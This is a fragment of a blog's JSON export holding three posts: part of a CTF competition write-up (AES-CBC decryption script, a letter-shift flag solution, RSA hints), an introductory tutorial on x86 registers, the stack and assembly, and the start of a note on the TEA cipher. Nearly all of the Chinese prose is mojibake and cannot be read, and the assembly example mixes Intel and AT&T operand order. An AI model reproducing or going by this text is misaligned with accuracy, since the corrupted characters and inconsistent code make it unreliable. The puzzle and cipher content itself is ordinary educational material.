å¯†æ•°æ®ï¼šåå…­è¿›åˆ¶å­—ç¬¦ä¸²cecadff28e93aa5d6f65128ae33e734d3f47b4b8a050d326c534a732d51b96e2a6a80dca0d5a704a216c2e0c3cc6aaafã€‚\nç¼–å†™è„šæœ¬ï¼Œä½¿ç”¨å¯†é’¥å’ŒIVå¯¹åŠ å¯†æ•°æ®è¿›è¡ŒAES-CBCè§£å¯†ï¼Œå¹¶å¤„ç†PKCS7å¡«å……ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 python from Crypto.Cipher import AES from Crypto.Util.Padding import unpad # åŠ å¯†æ•°æ®ï¼ˆåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼‰ encrypted_hex = \u0026#34;cecadff28e93aa5d6f65128ae33e734d3f47b4b8a050d326c534a732d51b96e2a6a80dca0d5a704a216c2e0c3cc6aaaf\u0026#34; ciphertext = bytes.fromhex(encrypted_hex) # å¯†é’¥å’ŒIVï¼ˆUTF-8ç¼–ç ï¼‰ key = b\u0026#39;HZNUHZNUHZNUHZNU\u0026#39; # 16å­—èŠ‚ iv = b\u0026#39;0202005503081501\u0026#39; # 16å­—èŠ‚ # åˆ›å»ºAESè§£å¯†å™¨ cipher = AES.new(key, AES.MODE_CBC, iv=iv) # è§£å¯†å¹¶å»é™¤å¡«å…… plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size) # è¾“å‡ºè§£å¯†ç»“æœ print(\u0026#34;è§£å¯†åçš„æ˜æ–‡:\u0026#34;, plaintext.decode(\u0026#39;utf-8\u0026#39;)) Crypto\rAAAAAAAAÂ·çœŸÂ·ç­¾åˆ°\ré¢˜ç›®ï¼š\n1 2 3 4 5 6 7 8 9 10 11 ç»™ä½ flagç­¾ä¸ªåˆ°å¥½äº† UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB} è¯¶ï¼Œæˆ‘çš„flagæ€ä¹ˆäº†ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ å¥½åƒå­—æ¯å¯¹ä¸ä¸Šäº† æˆ‘çš„ç­¾åˆ°æ€ä¹ˆåŠå‘€ï¼Œæ€¥æ€¥æ€¥ å¬è¯´ç¦æ¥é˜å¥½åƒæ˜¯TGCTFå¼€å¤´çš„å–” æ¯”è¾ƒé”™è¯¯å‰ç¼€UGBRCä¸æ­£ç¡®å‰ç¼€TGCTFï¼Œå‘ç°æ¯ä¸ªå­—æ¯çš„ç§»ä½é‡ä¾æ¬¡ä¸º-1, 0, +1, +2, +3ï¼Œå³ç¬¬iä¸ªå­—ç¬¦ï¼ˆä»0å¼€å§‹ï¼‰ç§»ä½é‡ä¸ºi-1ã€‚\nåŸå­—ç¬¦ä¸²ï¼š\n1 0:U,1:G,2:B,3:R,4:C,5:{,6:R,7:I,8:0,9:G,10:!,11:O,12:0,13:4,14:_,15:5,16:C,17:3,18:_,19:O,20:V,21:U,22:I,23:_,24:D,25:V,26:_,27:M,28:N,29:T,30:B,31:} å¯¹äºæ¯ä¸ªå­—æ¯å­—ç¬¦ï¼Œç§»ä½é‡æ˜¯å…¶ä½ç½®iå‡1ã€‚ä¾‹å¦‚ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 i=0:U â†’ç§»ä½-1 â†’T i=1:G â†’0 â†’G i=2:B â†’+1 â†’C i=3:R â†’+2 â†’T i=4:C â†’+3 â†’F i=6:R â†’i=6 â†’ç§»ä½5 â†’R+5=W i=7:I â†’ç§»ä½6 â†’I+6=O i=9:G â†’i=9 â†’ç§»ä½8 â†’G+8=O i=11:O â†’i=11 â†’ç§»ä½10 â†’O+10=Y i=16:C â†’i=16 â†’ç§»ä½15 â†’C+15=R i=19:O â†’i=19 â†’ç§»ä½18 â†’O+18= (Oæ˜¯ç¬¬14ä¸ªå­—æ¯ï¼ŒA=0çš„è¯ï¼Œ14+18=32 â†’32 mod26=6 â†’G) i=20:V â†’i=20 â†’ç§»ä½19 â†’V+19= (Væ˜¯21 â†’21+19=40 â†’40 mod26=14 â†’O) i=21:U â†’i=21 â†’ç§»ä½20 â†’U+20= (20+20=40 mod26=14 â†’O) i=22:I â†’i=22 â†’ç§»ä½21 â†’I+21= (8+21=29 mod26=3 â†’D) i=24:D â†’i=24 â†’ç§»ä½23 â†’D+23= (3+23=26 mod26=0 â†’A) i=25:V â†’i=25 â†’ç§»ä½24 â†’V+24= (21+24=45 mod26=19 â†’T) i=27:M â†’i=27 â†’ç§»ä½26 â†’M+26= (12+26=38 mod26=12 â†’M) i=28:N â†’i=28 â†’ç§»ä½27 â†’N+27= (13+27=40 mod26=14 â†’O) i=29:T â†’i=29 â†’ç§»ä½28 â†’T+28= (19+28=47 mod26=21 â†’V) i=30:B â†’i=30 â†’ç§»ä½29 â†’B+29= (1+29=30 mod26=4 â†’E) å°†è¿™äº›è½¬æ¢åçš„å­—æ¯ä»£å…¥åŸå­—ç¬¦ä¸²ï¼Œä¿æŒéå­—æ¯å­—ç¬¦ä¸å˜ï¼š\nTGCTF{ W O 0 O ! Y 0 4 _ 5 R 3 _ G O O D _ A T _ M O V E }\nç»„åˆèµ·æ¥ï¼š\nTGCTF{WO0O!Y04_5R3_GOOD_AT_MOVE}\nè´¹å…‹ç‰¹å°”\rç›´æ¥åˆ†è§£nå°±è¡Œ\nmmä¸èº²çŒ«çŒ«\rç¬¬ä¸€ç»„å’Œç¬¬ä¸‰ç»„çš„næœ‰ä¸€ä¸ªå…¬å› æ•°ï¼Œäºæ˜¯å°±åˆ†è§£å‡ºæ¥äº†\nå®å®RSA\rç¬¬ä¸€éƒ¨åˆ†eæ˜¯ç´ æ•°å¹¶ä¸”èŒƒå›´æ¯”è¾ƒå°ç›´æ¥çˆ†ç ´ï¼Œç¬¬äºŒéƒ¨åˆ†e=3ç›´æ¥å¼€3æ¬¡æ ¹å°±å¾—åˆ°flag\ntRwSiAns\ræ‰”åˆ°sagemathé‡Œè§£æœ‰é™åŸŸä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹å°±è¡Œäº†\nMisc\rwhere it is(osint)\ré¢˜ç›®è¯´flagå½¢å¼ä¸ºTGCTF{å³ä¸Šè§’è½¨é“åˆ°ç«™çš„ç«™å}\nè°·æ­Œæœå›¾ï¼Œå®šä½åˆ°æ¸¯å¢˜ç«™\nflag{æ¸¯å¢˜ç«™}\nå¥½è¿æ¥\ræˆ‘å¬åˆ°äº†å¼ºè¿çš„å›å“ï¼Œflagæ˜¯CTFeræœ€å–œæ¬¢çš„æ•°å­—ï¼š\nTGCTF{114514}\nç®€å•ç­¾åˆ°ï¼Œå…³æ³¨ï¼šâ€æ­å¸ˆå¤§ç½‘å®‰â€œè°¢è°¢å–µğŸ±\rå…³æ³¨å°±å‘flagï¼ˆï¼‰\n","date":"2025-06-01T10:31:51+08:00","permalink":"https://Oight.github.io/p/tgctf%E9%83%A8%E5%88%86wp/","title":"TGCTFéƒ¨åˆ†WP"},{"content":"Windowså†…æ ¸é€†å‘æ¯”è¾ƒæ·±å…¥åº•å±‚ï¼Œä»åº•å±‚å¼€å§‹å­¦ä¹ æ›´æœ‰åˆ©äºè¿›æ­¥ï¼Œå› æ­¤åœ¨è¿™é‡Œä½œé•¿æ–‡æ•´ç†ä¸€ä¸‹\næ±‡ç¼–è¯­è¨€å­¦ä¹ \rä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨é«˜çº§è¯­è¨€è¯ç”Ÿå‰ï¼Œä¸“å®¶ä»¬éƒ½æ˜¯æ‰‹æ“äºŒè¿›åˆ¶æ¥ä½¿ç”µè„‘è¿è¡Œçš„ï¼Œä¸è¿‡è¿™æ ·æœªå…å¤ªè¿‡äºè´¹ä¸“å®¶ï¼Œä¸ºäº†è§£å†³äºŒè¿›åˆ¶å¯è¯»æ€§å¤ªå·®ï¼Œå®Œå…¨ä¸çŸ¥é“è®¡ç®—æœºåœ¨å¹²ä»€ä¹ˆçš„é—®é¢˜ï¼Œå·¥ç¨‹å¸ˆå°†é‚£äº›æŒ‡ä»¤å†™æˆäº†å…«è¿›åˆ¶ã€‚äºŒè¿›åˆ¶è½¬å…«è¿›åˆ¶æ˜¯è½»è€Œæ˜“ä¸¾çš„ï¼Œä½†æ˜¯å…«è¿›åˆ¶çš„å¯è¯»æ€§ä¹Ÿä¸è¡Œã€‚å¾ˆè‡ªç„¶åœ°ï¼Œæœ€åè¿˜æ˜¯ç”¨æ–‡å­—è¡¨è¾¾ï¼ŒåŠ æ³•æŒ‡ä»¤å†™æˆ ADDã€‚å†…å­˜åœ°å€ä¹Ÿä¸å†ç›´æ¥å¼•ç”¨ï¼Œè€Œæ˜¯ç”¨æ ‡ç­¾è¡¨ç¤ºã€‚\nè¿™æ ·çš„è¯ï¼Œå°±å¤šå‡ºä¸€ä¸ªæ­¥éª¤ï¼Œè¦æŠŠè¿™äº›æ–‡å­—æŒ‡ä»¤ç¿»è¯‘æˆäºŒè¿›åˆ¶ï¼Œè¿™ä¸ªæ­¥éª¤å°±ç§°ä¸º assemblingï¼Œå®Œæˆè¿™ä¸ªæ­¥éª¤çš„ç¨‹åºå°±å«åš assemblerã€‚å®ƒå¤„ç†çš„æ–‡æœ¬ï¼Œè‡ªç„¶å°±å«åš aseembly codeã€‚æ ‡å‡†åŒ–ä»¥åï¼Œç§°ä¸º assembly languageï¼Œç¼©å†™ä¸º asmï¼Œä¸­æ–‡è¯‘ä¸ºæ±‡ç¼–è¯­è¨€ã€‚\nåœ¨æ—©æœŸçš„é«˜çº§è¯­è¨€ä¸­ï¼ˆå¦‚C/C++ï¼‰åœ¨ç¼–è¯‘æ—¶éƒ½æ˜¯å…ˆå°†ä»£ç è½¬æ¢æˆæ±‡ç¼–è¯­è¨€ï¼Œå†è½¬æ¢ä¸ºæœºå™¨è¯­è¨€æ¥æ‰§è¡Œçš„\nè¯·å…ˆäº†è§£å¯„å­˜å™¨å’Œå†…å­˜æ¨¡å‹ï¼ˆè¯¦æƒ…å‚é˜…è®¡ç®—æœºç»„æˆåŸç†ï¼‰\nå¯„å­˜å™¨ä¸å†…å­˜\rå¯„å­˜å™¨\ræˆ‘ä»¬éƒ½çŸ¥é“ Cache ï¼Œè€Œå¯„å­˜å™¨ï¼ˆregistersï¼‰æ˜¯æ¯” Cache æ›´åŠ åº•å±‚çš„ç”¨äºå­˜å‚¨æ•°æ®å¹¶ä¸è®¡ç®—æœºäº¤äº’çš„ä¸œè¥¿ï¼Œè®¡ç®—æœºä¸­æœ€é¢‘ç¹è¯»å†™çš„æ•°æ®ï¼Œéƒ½ä¼šæ”¾è¿›å¯„å­˜å™¨ä¸­ï¼ŒCPUä¼˜å…ˆè¯»å†™å¯„å­˜å™¨ï¼Œå†ç”±å¯„å­˜å™¨å’Œå†…å­˜äº¤æ¢æ•°æ®\næ—©æœŸçš„x86 CPU åªæœ‰8ä¸ªå¯„å­˜å™¨ï¼ˆå½“ç„¶ç°åœ¨æœ‰å¾ˆå¤šäº†ï¼‰ï¼Œå¹¶ä¸”æ¯ä¸ªéƒ½æœ‰ä¸åŒçš„ç”¨é€”ã€‚æ¥çœ‹çœ‹æœ‰å“ªäº›ï¼š\n1 2 3 4 5 6 7 8 EAX EBX ECX EDX EDI ESI EBP ESP å…¶ä¸­å‰ä¸ƒä¸ªæ˜¯é€šç”¨å¯„å­˜å™¨ï¼Œè€ŒESPå¯„å­˜å™¨ç”¨æ¥å­˜å‚¨å½“å‰Stackçš„åœ°å€\næˆ‘ä»¬å¸¸å¸¸çœ‹åˆ°32ä½ï¼Œ64ä½CPUå°±æ˜¯æŒ‡å¯„å­˜å™¨çš„å¤§å°ã€‚\nå†…å­˜\rç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿä¼šç»™å®ƒåˆ†é…ä¸€æ®µå†…å­˜ï¼Œç”¨æ¥å‚¨å­˜ç¨‹åºå’Œè¿è¡Œäº§ç”Ÿçš„æ•°æ®ã€‚è¿™æ®µå†…å­˜æœ‰èµ·å§‹åœ°å€å’Œç»“æŸåœ°å€ï¼Œæ¯”å¦‚ä»0x1000åˆ°0x8000ï¼Œèµ·å§‹åœ°å€æ˜¯è¾ƒå°çš„é‚£ä¸ªåœ°å€ï¼Œç»“æŸåœ°å€æ˜¯è¾ƒå¤§çš„é‚£ä¸ªåœ°å€ã€‚\nHeap\rHeapï¼ˆå †ï¼‰ï¼Œåœ¨æ“ä½œç³»ç»Ÿåˆ†é…ç»™ç¨‹åºçš„å†…å­˜ä¸­ï¼Œå †ç”¨æ¥å­˜å‚¨ç”¨æˆ·è¯·æ±‚çš„æ•°æ®ï¼Œæ¯”å¦‚ç”¨æˆ·è¾“å…¥ï¼Œå †ä¸­çš„æ•°æ®ç”±ä½ä½å‘é«˜ä½å¢é•¿ï¼ŒåŒæ—¶ï¼Œå­˜å‚¨åœ¨å †ä¸­çš„æ•°æ®éœ€è¦æ‰‹åŠ¨é‡Šæ”¾ï¼ˆæˆ–å€ŸåŠ©åƒåœ¾å›æ”¶æœºåˆ¶ï¼‰\nä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­çš„æ•°æ®éƒ½æ˜¯é•¿åº¦ä¸å®šçš„ï¼Œä¸æ˜ç¡®çš„æ•°æ®\nStack\rStackï¼ˆæ ˆï¼‰ï¼Œæ ˆæ˜¯å…·æœ‰ç‰¹å®šå¤§å°å’Œæ ¼å¼çš„å†…å­˜ç©ºé—´ï¼Œç”¨äºå­˜å‚¨æ˜ç¡®çš„æ•°æ®ï¼Œå¦‚å­—ç¬¦ä¸²å­—é¢é‡ï¼Œä¹Ÿå¯ä»¥ç”¨äºå­˜å‚¨æŒ‡é’ˆï¼Œæ ˆåœ¨ä½œç”¨åŸŸç»“æŸåä¼šè‡ªåŠ¨é‡Šæ”¾å†…å­˜ã€‚\nä¾‹å¦‚ï¼š\n1 2 3 4 int main() { int a = 2; int b = 3; } è¿™ä¸ªCä»£ç è¿è¡Œmainå‡½æ•°æ—¶ï¼Œç³»ç»Ÿä¼šä¸ºå®ƒåœ¨å†…å­˜ä¸­å»ºç«‹ä¸€ä¸ªå¸§ï¼ˆframeï¼‰ï¼Œæ‰€æœ‰mainçš„å†…éƒ¨å˜é‡ï¼ˆæ¯”å¦‚aå’Œbï¼‰éƒ½ä¿å­˜åœ¨è¿™ä¸ªå¸§é‡Œé¢ã€‚mainå‡½æ•°æ‰§è¡Œç»“æŸåï¼Œè¯¥å¸§å°±ä¼šè¢«å›æ”¶ï¼Œé‡Šæ”¾æ‰€æœ‰çš„å†…éƒ¨å˜é‡ï¼Œä¸å†å ç”¨ç©ºé—´ã€‚\nä¸€ä¸ªç¨‹åºé‡Œæœ‰å¤šå°‘å‡½æ•°ï¼Œå°±ä¼šæœ‰å¤šå°‘ä¸ªæ ˆå¸§ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œè°ƒç”¨æ ˆæœ‰å¤šå°‘å±‚ï¼Œå°±æœ‰å¤šå°‘å¸§ã€‚æ¯ä¸€å±‚å‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œæ ˆå¸§å°±ä¼šè¢«å›æ”¶ï¼Œç„¶åç¨‹åºæ‰§è¡Œä¸‹ä¸€å±‚ï¼Œé€šè¿‡è¿™ç§æœºåˆ¶ï¼Œå°±å®ç°äº†å‡½æ•°çš„å±‚å±‚è°ƒç”¨ï¼Œå¹¶ä¸”æ¯ä¸€å±‚éƒ½èƒ½ä½¿ç”¨è‡ªå·±çš„æœ¬åœ°å˜é‡ã€‚\næ‰€æœ‰çš„å¸§éƒ½å­˜æ”¾åœ¨ Stackï¼Œç”±äºå¸§æ˜¯ä¸€å±‚å±‚å åŠ çš„ï¼Œæ‰€ä»¥ Stack å«åšæ ˆã€‚ç”Ÿæˆæ–°çš„å¸§ï¼Œå«åšâ€å…¥æ ˆâ€ï¼Œè‹±æ–‡æ˜¯ pushï¼›æ ˆçš„å›æ”¶å«åšâ€å‡ºæ ˆâ€ï¼Œè‹±æ–‡æ˜¯ popã€‚Stack çš„ç‰¹ç‚¹å°±æ˜¯ï¼Œæœ€æ™šå…¥æ ˆçš„å¸§æœ€æ—©å‡ºæ ˆï¼ˆå› ä¸ºæœ€å†…å±‚çš„å‡½æ•°è°ƒç”¨ï¼Œæœ€å…ˆç»“æŸè¿è¡Œï¼‰ï¼Œè¿™å°±å«åšâ€åè¿›å…ˆå‡ºâ€çš„æ•°æ®ç»“æ„ã€‚æ¯ä¸€æ¬¡å‡½æ•°æ‰§è¡Œç»“æŸï¼Œå°±è‡ªåŠ¨é‡Šæ”¾ä¸€ä¸ªå¸§ï¼Œæ‰€æœ‰å‡½æ•°æ‰§è¡Œç»“æŸï¼Œæ•´ä¸ª Stack å°±éƒ½é‡Šæ”¾äº†ã€‚\nStack æ˜¯ç”±å†…å­˜åŒºåŸŸçš„ç»“æŸåœ°å€å¼€å§‹ï¼Œä»é«˜ä½ï¼ˆåœ°å€ï¼‰å‘ä½ä½ï¼ˆåœ°å€ï¼‰åˆ†é…ã€‚æ¯”å¦‚ï¼Œå†…å­˜åŒºåŸŸçš„ç»“æŸåœ°å€æ˜¯0x8000ï¼Œç¬¬ä¸€å¸§å‡å®šæ˜¯16å­—èŠ‚ï¼Œé‚£ä¹ˆä¸‹ä¸€æ¬¡åˆ†é…çš„åœ°å€å°±ä¼šä»0x7FF0å¼€å§‹ï¼›ç¬¬äºŒå¸§å‡å®šéœ€è¦64å­—èŠ‚ï¼Œé‚£ä¹ˆåœ°å€å°±ä¼šç§»åŠ¨åˆ°0x7FB0ã€‚\næ±‡ç¼–æŒ‡ä»¤\ræˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªç®€å•çš„Cç¨‹åºï¼š\n1 2 3 4 5 6 7 int add_a_and_b(int a, int b) { return a + b; } int main() { return add_a_and_b(2, 3); } gcc å°†è¿™ä¸ªç¨‹åºè½¬æˆæ±‡ç¼–è¯­è¨€ã€‚\n1 $ gcc -S example.c ä¸Šé¢çš„å‘½ä»¤æ‰§è¡Œä»¥åï¼Œä¼šç”Ÿæˆä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶example.sï¼Œé‡Œé¢å°±æ˜¯æ±‡ç¼–è¯­è¨€ï¼ŒåŒ…å«äº†å‡ åè¡ŒæŒ‡ä»¤ã€‚è¿™ä¹ˆè¯´å§ï¼Œä¸€ä¸ªé«˜çº§è¯­è¨€çš„ç®€å•æ“ä½œï¼Œåº•å±‚å¯èƒ½ç”±å‡ ä¸ªï¼Œç”šè‡³å‡ åä¸ª CPU æŒ‡ä»¤æ„æˆã€‚CPU ä¾æ¬¡æ‰§è¡Œè¿™äº›æŒ‡ä»¤ï¼Œå®Œæˆè¿™ä¸€æ­¥æ“ä½œã€‚\nexample.sç»è¿‡ç®€åŒ–ä»¥åï¼Œå¤§æ¦‚æ˜¯ä¸‹é¢çš„æ ·å­ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 _add_a_and_b: push %ebx mov %eax, [%esp+8] mov %ebx, [%esp+12] add %eax, %ebx pop %ebx ret _main: push 3 push 2 call _add_a_and_b add %esp, 8 ret æˆ‘ä»¬æ¥å…·ä½“çœ‹çœ‹æ¯ä¸€è¡Œå‡½æ•°çš„å®ç°è¿‡ç¨‹:\næˆ‘ä»¬çŸ¥é“mainå‡½æ•°æ˜¯ç¨‹åºçš„å…¥å£å¤„ï¼Œå¤§å¤šæ•°ç¨‹åºä¹Ÿæ˜¯ä»è¿™é‡Œå¼€å§‹æ‰§è¡Œçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆçœ‹çœ‹mainå‡½æ•°\npush 3\né¦–å…ˆæ˜¯å°† 3 å‹å…¥æ ˆä¸­ï¼Œè™½ç„¶çœ‹ä¸Šå»å¾ˆç®€å•ï¼ŒpushæŒ‡ä»¤å…¶å®æœ‰ä¸€ä¸ªå‰ç½®æ“ä½œã€‚å®ƒä¼šå…ˆå–å‡º ESP å¯„å­˜å™¨é‡Œé¢çš„åœ°å€ï¼Œå°†å…¶å‡å»4ä¸ªå­—èŠ‚ï¼Œç„¶åå°†æ–°åœ°å€å†™å…¥ ESP å¯„å­˜å™¨ã€‚ä½¿ç”¨å‡æ³•æ˜¯å› ä¸º Stack ä»é«˜ä½å‘ä½ä½å‘å±•ï¼Œ4ä¸ªå­—èŠ‚åˆ™æ˜¯å› ä¸º3çš„ç±»å‹æ˜¯intï¼Œå ç”¨4ä¸ªå­—èŠ‚ã€‚å¾—åˆ°æ–°åœ°å€ä»¥åï¼Œ 3 å°±ä¼šå†™å…¥è¿™ä¸ªåœ°å€å¼€å§‹çš„å››ä¸ªå­—èŠ‚ã€‚\nä½ å¯èƒ½å¾ˆç–‘æƒ‘ï¼Œä¸ºä»€ä¹ˆæ˜¯ ESP å¯„å­˜å™¨ï¼Œè¿˜è®°å¾—æˆ‘ä»¬å‰é¢è¯´è¿‡ï¼Œ ESP å¯„å­˜å™¨æ˜¯å¹²å˜›çš„å—ï¼Ÿå®ƒæ˜¯ç”¨æ¥å­˜å‚¨å½“å‰Stackçš„åœ°å€çš„ï¼Œæ‰€ä»¥ä¼šé¦–å…ˆå¯¹ ESP å¯„å­˜å™¨è¿›è¡Œæ“ä½œã€‚\næˆ‘ä»¬ç»§ç»­çœ‹ï¼Œè¿™é‡Œå‡å»4ä¸ªå­—èŠ‚çš„æ“ä½œå°±ç›¸å½“äºæ˜¯æŠŠ3å­˜åœ¨äº†è¿™é‡Œï¼Œå› ä¸º3å ç”¨äº†4ä¸ªå­—èŠ‚\npush 2\nåŒæ ·çš„ï¼Œè¿™é‡Œå°† 2 å‹å…¥æ ˆä¸­ï¼Œä½ç½®ç´§è´´ç€ 3 ï¼Œè¿™æ—¶ ESP å¯„å­˜å™¨ä¼šå†å‡å»4ä¸ªå­—èŠ‚ï¼ˆç´¯è®¡å‡å»8ï¼‰\nç„¶ååˆ°\ncall _add_a_and_b\nè¿™é‡Œçš„callæŒ‡ä»¤ç”¨æ¥è°ƒç”¨å‡½æ•°ï¼Œè¿™æ—¶æˆ‘ä»¬è¿› _add_a_and_b å‡½æ•°çœ‹çœ‹\n1 push %ebx è¿™ä¸€è¡Œè¡¨ç¤ºå°† EBX å¯„å­˜å™¨é‡Œé¢çš„å€¼ï¼Œå†™å…¥_add_a_and_bè¿™ä¸ªå¸§ã€‚è¿™æ˜¯å› ä¸ºåé¢è¦ç”¨åˆ°è¿™ä¸ªå¯„å­˜å™¨ï¼Œå°±å…ˆæŠŠé‡Œé¢çš„å€¼å–å‡ºæ¥ï¼Œç”¨å®Œåå†å†™å›å»ã€‚\nè¿™æ—¶ï¼ŒpushæŒ‡ä»¤ä¼šå†å°† ESP å¯„å­˜å™¨é‡Œé¢çš„åœ°å€å‡å»4ä¸ªå­—èŠ‚ï¼ˆç´¯è®¡å‡å»12ï¼‰ã€‚\n1 mov %eax, [%esp+8] è¿™é‡Œè¡¨ç¤ºç»™ ESP å¯„å­˜å™¨é‡Œé¢çš„åœ°å€åŠ ä¸Š8ä¸ªå­—èŠ‚ï¼Œç„¶åå­˜å‚¨åˆ° EAX å¯„å­˜å™¨ä¸­ï¼Œï¼ˆå³æŠŠ2ä» ESP å¯„å­˜å™¨ä¸­å–å‡ºï¼Œæ”¾è¿› EAX å¯„å­˜å™¨ä¸­ï¼‰\n1 mov %ebx, [%esp+12] åŒæ ·çš„ï¼Œè¿™é‡Œç»™ ESP å¯„å­˜å™¨é‡Œé¢çš„åœ°å€åŠ ä¸Š12ä¸ªå­—èŠ‚ï¼Œç„¶åå­˜å‚¨åˆ° EAX å¯„å­˜å™¨ä¸­ï¼Œï¼ˆå³æŠŠ3ä» ESP å¯„å­˜å™¨ä¸­å–å‡ºï¼Œæ”¾è¿› EBX å¯„å­˜å™¨ä¸­ï¼‰\n1 add %eax, %ebx ç„¶åæ˜¯ add æŒ‡ä»¤ï¼Œadd æŒ‡ä»¤ç”¨äºå°†ä¸¤ä¸ªè¿ç®—å­ç›¸åŠ ï¼ˆ%ebxæ˜¯è¯¥æŒ‡ä»¤è¦ç”¨åˆ°çš„è¿ç®—å­ã€‚ä¸€ä¸ª CPU æŒ‡ä»¤å¯ä»¥æœ‰é›¶ä¸ªåˆ°å¤šä¸ªè¿ç®—å­ã€‚ï¼‰\nè¿™é‡Œæ˜¯æŠŠ EBX å¯„å­˜å™¨ä¸­çš„å€¼ï¼ˆ3ï¼‰å’Œ EAX å¯„å­˜å™¨ä¸­çš„å€¼ï¼ˆ2ï¼‰ç›¸åŠ ï¼Œç„¶åå­˜å‚¨åˆ°ç¬¬ä¸€ä¸ªè¿ç®—å­ï¼ˆEAXå¯„å­˜å™¨ï¼‰ä¸­\n1 pop %ebx EBX å¯„å­˜å™¨å·²ç»æ²¡æœ‰ç”¨æ­¦ä¹‹åœ°äº†ï¼Œæ‰€ä»¥æŠŠå®ƒæ¨å‡ºæ ˆï¼ŒpopæŒ‡ä»¤ç”¨äºå–å‡º Stack æœ€è¿‘ä¸€ä¸ªå†™å…¥çš„å€¼ï¼ˆå³æœ€ä½ä½åœ°å€çš„å€¼ï¼‰ï¼Œå¹¶å°†è¿™ä¸ªå€¼å†™å…¥è¿ç®—å­æŒ‡å®šçš„ä½ç½®ã€‚\nä¸Šé¢çš„ä»£ç è¡¨ç¤ºï¼Œå–å‡º Stack æœ€è¿‘å†™å…¥çš„å€¼ï¼ˆå³ EBX å¯„å­˜å™¨çš„åŸå§‹å€¼ï¼‰ï¼Œå†å°†è¿™ä¸ªå€¼å†™å› EBX å¯„å­˜å™¨ï¼ˆå› ä¸ºåŠ æ³•å·²ç»åšå®Œäº†ï¼ŒEBX å¯„å­˜å™¨ç”¨ä¸åˆ°äº†ï¼‰ã€‚\næ³¨æ„ï¼ŒpopæŒ‡ä»¤è¿˜ä¼šå°† ESP å¯„å­˜å™¨é‡Œé¢çš„åœ°å€åŠ 4ï¼Œå³å›æ”¶4ä¸ªå­—èŠ‚ã€‚ï¼ˆè¿™é‡Œå°±æ˜¯åœ¨å†…å­˜å›æ”¶ï¼‰\n1 ret retæŒ‡ä»¤ç”¨äºç»ˆæ­¢å½“å‰å‡½æ•°çš„æ‰§è¡Œï¼Œå°†è¿è¡Œæƒäº¤è¿˜ç»™ä¸Šå±‚å‡½æ•°ã€‚ä¹Ÿå°±æ˜¯ï¼Œå½“å‰å‡½æ•°çš„å¸§å°†è¢«å›æ”¶ã€‚\næ‰€ä»¥ _add_a_and_b å‡½æ•°ä»¥åŠæ‰§è¡Œå®Œäº†ï¼Œæˆ‘ä»¬å›åˆ° main å‡½æ•°ä¸­å»\n1 add %esp, 8 è¿™é‡Œç»™ ESP å¯„å­˜å™¨çš„åœ°å€åŠ ä¸Š8 å› ä¸ºæˆ‘ä»¬çš„ç»“æœå·²ç»å†™å…¥åˆ°äº† EAX å¯„å­˜å™¨ä¸­ï¼Œè¿™é‡Œ ESP å¯„å­˜å™¨å·²ç»ç”¨ä¸åˆ°äº†ï¼Œæ‰€ä»¥å›æ”¶å®ƒçš„å†…å­˜ï¼Œç»™å®ƒçš„åœ°å€åŠ ä¸Š8ä¸ªå­—èŠ‚ä½¿å…¶æ¢å¤åŸä½\n1 ret æœ€å main å‡½æ•°ç»“æŸï¼Œç¨‹åºè¿è¡Œå®Œæ¯•\n","date":"2025-06-01T10:31:36+08:00","image":"https://old.roi4cio.com/fileadmin/user_upload/Microsoft_Windows.png","permalink":"https://Oight.github.io/p/windows%E5%86%85%E6%A0%B8%E9%80%86%E5%90%91/","title":"Windowså†…æ ¸é€†å‘"},{"content":"é€†å‘ç®—æ³•å¤ä¹ ç¬¬äºŒå¼¹ï¼šTeaç³»åˆ—ç®—æ³•\nTeaç®—æ³•\râ€œTEAâ€ çš„å…¨ç§°ä¸ºâ€Tiny Encryption Algorithmâ€ ç”±äºå®ç°ç®€å•ï¼ŒåŠ å¯†å®‰å…¨ï¼ˆQQå’Œå¾®ä¿¡çš„ä¸€äº›åè®®ä¸­å°±æ˜¯ä½¿ç”¨çš„TeaåŠ å¯†ï¼‰ï¼Œæ·±å—ctfå‡ºé¢˜äººçš„å–œçˆ±ã€‚å› æ­¤teaç®—æ³•æˆä¸ºctf REerçš„ä¸€ç§å¿…å­¦ç®—æ³•ã€‚TEAç®—æ³•ä½¿ç”¨64ä½çš„æ˜æ–‡åˆ†ç»„å’Œ128ä½çš„å¯†é’¥ï¼Œå®ƒä½¿ç”¨Feistelåˆ†ç»„åŠ å¯†æ¡†æ¶ï¼Œéœ€è¦è¿›è¡Œ 64 è½®è¿­ä»£ã€‚è¯¥ç®—æ³•ä½¿ç”¨äº†ä¸€ä¸ªç¥ç§˜å¸¸æ•°Î´ä½œä¸ºå€æ•°ï¼Œå®ƒæ¥æºäºé»„é‡‘æ¯”ç‡2654435769 ï¼ˆ0x9E3779B9ï¼‰ï¼Œä»¥ä¿è¯æ¯ä¸€è½®åŠ å¯†éƒ½ä¸ç›¸åŒã€‚\nTeaç®—æ³•å®ç°ï¼š\råŠ å¯†\råŠ å¯†ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 c void encrypt(uint32_t* v,uint32_t* key){ uint32_t v0=v[0],v1=v[1],sum=0,i; uint32_t delta=0x9e3779b9; uint32_t k0=key[0],k1=key[1],k2=key[2],k3=key[3]; for(i=0;i\u0026lt;32;i++){ sum+=delta; v0+=((v1\u0026lt;\u0026lt;4)+k0)^(v1+sum)^((v1\u0026gt;\u0026gt;5)+k1); v1+=((v0\u0026lt;\u0026lt;4)+k2)^(v0+sum)^((v0\u0026gt;\u0026gt;5)+k3); } v[0]=v0;v[1]=v1; } è§£å¯†\råŠ 